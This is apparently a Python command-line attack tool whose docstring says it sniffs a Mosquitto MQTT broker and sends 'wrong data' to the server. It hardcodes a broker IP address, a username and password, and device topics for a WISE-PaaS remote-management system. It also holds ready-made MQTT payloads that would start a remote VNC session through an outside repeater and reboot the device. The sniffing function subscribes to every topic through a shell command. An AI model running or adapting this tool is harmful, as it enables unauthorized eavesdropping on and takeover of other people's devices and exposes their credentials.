import click
import configparser
import os

PATH = "Sources/config.ini"
VERSION = "1.5"

def create_config(path):
    """
    Create a config file
    """
    config = configparser.ConfigParser()
    config.add_section("SETTINGS")
    config.set("SETTINGS", "LOG_ENABLED", "Disable")
    config.add_section("LOG_PATHS")
    config.set("LOG_PATHS", "LOG_SNIFFING", "Sources/Logs/Logs_sniff.txt")
    config.set("LOG_PATHS", "LOG_REBOOTING", "Sources/Logs/Logs_reboot.txt")
    config.set("LOG_PATHS", "LOG_HACKING_ETH", "Sources/Logs/Logs_hack.txt")
    config.set("LOG_PATHS", "LOG_VNC", "Sources/Logs/Logs_vnc.txt")
    config.set("LOG_PATHS", "LOG_TERMINAL", "Sources/Logs/Logs_terminal.txt")
    config.set("LOG_PATHS", "LOG_TEMP", "Sources/Logs/Temp.txt")
    config.add_section("STRINGS")
    config.set("STRINGS", "DEFAULT_SUB_STRING", 'mosquitto_sub -h "40.83.90.55" -p "1883" -u "6cee881f34eb4b70d0ceae01bcffc2e6_created" -P "588b57132675603bf9cc7910bd6f1409" -t')
    config.set("STRINGS", "DEFAULT_ACK_TOPIC", '"/wisepaas/RMM/00000001-0000-0000-0000-080027D2C214/agentactionack"')
    config.set("STRINGS", "DEFAULT_REQ_TOPIC", '"/wisepaas/RMM/00000001-0000-0000-0000-080027D2C214/agentactionreq"')
    config.set("STRINGS", "DEFAULT_PUB_STRING", 'mosquitto_pub -h "40.83.90.55" -p "1883" -u "6cee881f34eb4b70d0ceae01bcffc2e6_created" -P "588b57132675603bf9cc7910bd6f1409" -t')
    config.set("STRINGS", "DEFAULT_VNC_MSG",'-m "{""vncServerStartMode"":3,""catalogID"":4,""vncServerStartRepeaterID"":1935,""handlerName"":""remote_kvm"",""commCmd"":139,""vncServerStartNeedChangePassword"":0,""vncServerStartRepeaterURL"":""deviceon-vnc.wise-paas.com""}"')
    config.set("STRINGS", "DEFAULT_REBOOT_MSG", '-m "{""susiCommData"":{""catalogID"":4,""handlerName"":""power_onoff"",""commCmd"":77}}"')



    with open(path, "w") as config_file:
        config.write(config_file)


def get_config(path):
    """
    Returns the config object
    """
    if not os.path.exists(path):
        create_config(path)

    config = configparser.ConfigParser()
    config.read(path)
    return config


def get_setting(path, section, setting):
    """
    Returns a setting
    """
    config = get_config(path)
    value = config.get(section, setting)
    return value


def update_setting(path, section, setting, value):
    """
    Update a setting
    """
    config = get_config(path)
    config.set(section, setting, value)
    with open(path, "w") as config_file:
        config.write(config_file)


def change_log(ctx, param, value):
    if not value or ctx.resilient_parsing:
        return
    LOG_ENABLED = get_setting(PATH, "SETTINGS", "LOG_ENABLED")
    if LOG_ENABLED == "Disabled":
        update_setting(PATH, "SETTINGS", "LOG_ENABLED", "Enabled")
    else:
        update_setting(PATH, "SETTINGS", "LOG_ENABLED", "Disabled")
    ctx.exit()


def sniff_eth(ctx, param, value):
    if not value or ctx.resilient_parsing:
        return
    if get_setting(PATH, "SETTINGS", "LOG_ENABLED") == "Disabled":
        if value[0] == "default":
            click.echo('\nSniffing ' + value[0] + '...')
            click.echo(os.system(""))
            click.echo(os.system(
                get_setting(PATH, "STRINGS", "default_sub_string") + ' "#" -v'))
    else:
        if value[0] == "default":
            click.echo('\nSniffing ' + value[0] + '...')
            click.echo(os.system(""))
            click.echo(os.system(
                get_setting(PATH, "STRINGS", "default_sub_string") + ' "#" -v >> %s' %
                get_setting(PATH, "LOG_PATHS", "LOG_SNIFFING")))
    ctx.exit()

def print_version(ctx, param, value):
    if not value or ctx.resilient_parsing:
        return
    click.echo(VERSION)
    ctx.exit()


@click.command()
@click.option(
    '--sniff', nargs=3, help='Sniff traffic on broker', callback=sniff_eth,
    expose_value=False, type=str, metavar='ip login passw'
)
@click.option(
    '--log', help='Logging ' + get_setting(PATH, "SETTINGS", "LOG_ENABLED") + ' right now',
    is_eager=True, expose_value=False, callback=change_log, is_flag=True
)
@click.option(
    '--v', is_flag=True, callback=print_version,
    expose_value=False, is_eager=True, help='Get tool\'s version'
)

def main():
    """
        Tool for sniffing mosquitto broker and sending wrong data to server.
    """

if __name__ == '__main__':
    main()
